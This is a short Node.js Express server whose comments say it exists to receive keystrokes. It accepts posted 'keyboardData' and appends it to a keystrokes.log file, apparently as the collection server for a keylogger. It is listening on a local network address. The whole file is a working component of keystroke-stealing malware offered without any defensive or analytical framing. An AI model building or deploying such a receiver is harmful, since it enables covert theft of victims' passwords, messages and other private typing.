const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();
const port = 3000;

// Middleware to parse JSON bodies
app.use(bodyParser.json());

// Endpoint to receive keystrokes
app.post('/', (req, res) => {
    const keyboardData = req.body.keyboardData;
    if (keyboardData) {
        console.log("Received keyboard data:", keyboardData);
        // Append the received data to a file
        fs.appendFile('keystrokes.log', keyboardData + '\n', (err) => {
            if (err) {
                console.error('Error writing to file', err);
                res.status(500).send('Internal Server Error');
            } else {
                res.status(200).send('Data received');
            }
        });
    } else {
        res.status(400).send('Bad Request: No keyboardData in request');
    }
});

// Start the server
app.listen(port, '0.0.0.0', () => {
    console.log(`Server listening at http://192.168.1.107:${port}`);
});
